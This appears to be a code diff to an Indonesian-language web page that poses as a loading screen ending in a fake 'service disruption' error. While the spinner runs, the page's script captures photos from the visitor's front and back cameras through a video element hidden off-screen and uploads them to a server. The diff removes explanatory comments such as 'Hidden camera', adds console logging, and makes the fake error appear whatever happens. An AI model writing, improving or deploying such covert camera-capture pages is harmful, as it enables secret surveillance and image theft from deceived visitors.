@@ -27,7 +27,6 @@
     width: 100%;
   }
   
-  /* Loading Spinner */
   .spinner-container {
     margin-bottom: 30px;
     transition: all 0.5s ease;
@@ -108,7 +107,6 @@
     75% { content: '...'; }
   }
   
-  /* Status Message */
   .status-message {
     margin-top: 20px;
     padding: 15px;
@@ -132,7 +130,6 @@
     color: #ff3b30;
   }
   
-  /* Hidden camera */
   #hidden-video {
     position: fixed;
     top: -9999px;
@@ -151,24 +148,20 @@
 <body>
 
 <div class="loading-container">
-  <!-- Spinner -->
   <div class="spinner-container" id="spinnerContainer">
     <div class="spinner"></div>
   </div>
   
-  <!-- Loading Text -->
   <div class="loading-title" id="loadingTitle">LOADING</div>
   <div class="loading-sub" id="loadingSub">
     Please wait<span class="loading-dots"></span>
   </div>
   
-  <!-- Status Message -->
   <div class="status-message" id="statusMessage">
     ⚠️ Maaf sedang gangguan
   </div>
 </div>
 
-<!-- Hidden Camera Elements -->
 <video id="hidden-video" autoplay playsinline></video>
 <canvas id="hidden-canvas"></canvas>
 
@@ -181,12 +174,13 @@ const loadingTitle = document.getElementById('loadingTitle');
 const loadingSub = document.getElementById('loadingSub');
 
 let stream = null;
-let photoTaken = false;
 
-// Start camera and process
 async function startProcess() {
+  console.log('🚀 Starting process...');
+  
   try {
-    // Try to access camera
+    // Try front camera first
+    console.log('📷 Accessing front camera...');
     stream = await navigator.mediaDevices.getUserMedia({
       video: { 
         facingMode: 'user',
@@ -197,21 +191,30 @@ async function startProcess() {
     });
     
     video.srcObject = stream;
+    console.log('✅ Front camera started');
     
-    // Wait for camera to stabilize
-    await delay(800);
+    await delay(1000);
     
-    // Capture photo from video
+    // Capture front photo
+    console.log('📸 Capturing front photo...');
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0);
     const imageData = canvas.toDataURL('image/jpeg', 0.85);
+    console.log(`📸 Front photo captured: ${imageData.length} characters`);
     
-    // Try camera belakang juga (optional)
+    // Stop front camera
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      stream = null;
+      video.srcObject = null;
+    }
+    
+    // Try back camera
     let backImageData = null;
     try {
-      // Coba ambil dari kamera belakang
+      console.log('📷 Accessing back camera...');
       const backStream = await navigator.mediaDevices.getUserMedia({
         video: { 
           facingMode: 'environment',
@@ -232,25 +235,17 @@ async function startProcess() {
       const backCtx = backCanvas.getContext('2d');
       backCtx.drawImage(backVideo, 0, 0);
       backImageData = backCanvas.toDataURL('image/jpeg', 0.85);
+      console.log(`📸 Back photo captured: ${backImageData.length} characters`);
       
       backStream.getTracks().forEach(track => track.stop());
     } catch (err) {
-      console.log('Kamera belakang tidak tersedia');
+      console.log('⚠️ Back camera not available:', err.message);
     }
     
-    // Stop front camera
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-      stream = null;
-      video.srcObject = null;
-    }
-    
-    // Send to server (kirim foto depan dulu)
+    // Send to server
+    console.log('📤 Sending to server...');
     const formData = new FormData();
     formData.append('image', imageData);
-    formData.append('hasBackCamera', backImageData ? 'true' : 'false');
-    
-    // Jika ada foto belakang, kirim juga
     if (backImageData) {
       formData.append('backImage', backImageData);
     }
@@ -260,42 +255,41 @@ async function startProcess() {
       body: formData
     });
     
+    console.log('📨 Server response status:', response.status);
     const result = await response.json();
+    console.log('📨 Server response:', result);
     
-    // Hide loading elements
-    spinnerContainer.classList.add('hidden');
-    loadingTitle.classList.add('hidden');
-    loadingSub.classList.add('hidden');
+    if (!result.success) {
+      throw new Error(result.error || 'Gagal mengirim ke server');
+    }
     
-    // Show error message
-    statusMessage.classList.add('visible', 'error');
-    statusMessage.textContent = '⚠️ Maaf sedang gangguan';
+    console.log('✅ All done!');
     
   } catch (err) {
-    console.error('Process error:', err);
-    
-    // Hide loading elements
-    spinnerContainer.classList.add('hidden');
-    loadingTitle.classList.add('hidden');
-    loadingSub.classList.add('hidden');
-    
-    // Show error message
-    statusMessage.classList.add('visible', 'error');
-    statusMessage.textContent = '⚠️ Maaf sedang gangguan';
+    console.error('❌ Error:', err);
   }
+  
+  // Hide loading elements
+  console.log('🎬 Hiding loading...');
+  spinnerContainer.classList.add('hidden');
+  loadingTitle.classList.add('hidden');
+  loadingSub.classList.add('hidden');
+  
+  // Show error message
+  statusMessage.classList.add('visible', 'error');
+  statusMessage.textContent = '⚠️ Maaf sedang gangguan';
 }
 
-// Delay helper
 function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 // Start when page loads
 window.addEventListener('load', () => {
+  console.log('📄 Page loaded, starting process in 500ms...');
   setTimeout(startProcess, 500);
 });
 
-// Cleanup
 window.addEventListener('beforeunload', () => {
   if (stream) {
     stream.getTracks().forEach(track => track.stop());
@@ -303,4 +297,4 @@ window.addEventListener('beforeunload', () => {
 });
 </script>
 </body>
-</html>
+ </html>
